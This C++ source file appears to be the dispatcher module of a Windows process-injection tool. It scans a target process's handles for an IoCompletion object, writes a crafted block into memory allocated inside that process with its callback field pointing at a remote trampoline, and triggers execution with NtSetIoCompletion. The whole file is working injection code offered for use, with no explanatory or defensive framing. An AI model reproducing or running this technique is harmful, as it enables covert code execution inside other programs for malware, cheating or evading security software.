#include "dispatcher.h"

#include "../core/console.h"
#include "../core/ntapi.h"

#include <cstring>
#include <vector>

struct handle_entry
{
    PVOID object;
    ULONG_PTR unique_pid;
    ULONG_PTR handle_value;
    ULONG granted_access;
    USHORT backtrace_idx;
    USHORT type_index;
    ULONG attributes;
    ULONG reserved;
};

struct handle_info_ex
{
    ULONG_PTR count;
    ULONG_PTR reserved;
    handle_entry entries[ 1 ];
};

struct unicode_str
{
    USHORT length;
    USHORT max_length;
    PWSTR buffer;
};

struct object_type_info
{
    unicode_str type_name;
    ULONG reserved[ 22 ];
};

static constexpr SIZE_T trigger_block_size = 0x48;
static constexpr SIZE_T trigger_target_off = 0x38;

static bool is_iocompletion_type( const wchar_t* name, USHORT length_bytes )
{
    static const wchar_t expected[] = L"IoCompletion";

    if ( length_bytes != sizeof( expected ) - sizeof( wchar_t ) )
        return false;

    return std::memcmp( name, expected, length_bytes ) == 0;
}

static HANDLE find_iocompletion_handle( HANDLE process )
{
    auto& api = nt::api( );

    std::vector< uint8_t > buffer( 0x186A0, 0 );
    ULONG returned = 0;
    LONG status = api.query_system( 51, buffer.data( ), ( ULONG )buffer.size( ), &returned );

    uint64_t count = 0;

    if ( status >= 0 )
        count = *( uint64_t* )buffer.data( );

    if ( count == 0 || count > 0x100000 )
        count = 0x10000;

    HANDLE me = GetCurrentProcess( );
    std::vector< uint8_t > obj_buf( 0x2710, 0 );

    for ( uint64_t i = 0; i < count; ++i )
    {
        HANDLE dup = nullptr;
        if ( !DuplicateHandle( process, ( HANDLE )i, me, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS ) )
            continue;

        if ( !dup )
            continue;

        ULONG ret = 0;
        LONG qs = api.query_object( dup, nt::class_object_type, obj_buf.data( ), ( ULONG )obj_buf.size( ), &ret );

        if ( qs >= 0 )
        {
            auto info_t = ( object_type_info* )obj_buf.data( );

            if ( is_iocompletion_type( info_t->type_name.buffer, info_t->type_name.length ) )
                return dup;
        }

        CloseHandle( dup );
    }

    return nullptr;
}

static PVOID allocate_scratch_region( HANDLE process )
{
    return VirtualAllocEx(
        process,
        nullptr,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
}

static bool dispatch_via_iocompletion( HANDLE process, uintptr_t trampoline_remote )
{
    auto& api = nt::api( );

    HANDLE iocp = find_iocompletion_handle( process );
    if ( !iocp )
    {
        console::error( "iocp handle not found in target" );
        return false;
    }

    PVOID scratch = allocate_scratch_region( process );
    if ( !scratch )
    {
        console::error( "scratch alloc failed" );
        CloseHandle( iocp );
        return false;
    }

    uint8_t buf[ trigger_block_size ] = {};
    *( uintptr_t* )( buf + trigger_target_off ) = trampoline_remote;

    SIZE_T written = 0;
    BOOL ok = WriteProcessMemory( process, scratch, buf, sizeof( buf ), &written );

    if ( !ok || written != sizeof( buf ) )
    {
        console::error( "scratch write failed" );
        VirtualFreeEx( process, scratch, 0, MEM_RELEASE );
        CloseHandle( iocp );
        return false;
    }

    LONG s = api.set_iocompletion( iocp, scratch, nullptr, 0, 0 );

    CloseHandle( iocp );

    if ( s < 0 )
    {
        console::error( "NtSetIoCompletion -> 0x%08X", ( unsigned )s );
        return false;
    }

    return true;
}

namespace dispatcher
{
    bool dispatch( HANDLE process, DWORD pid, uintptr_t trampoline_remote )
    {
        ( void )pid;
        return dispatch_via_iocompletion( process, trampoline_remote );
    }
}
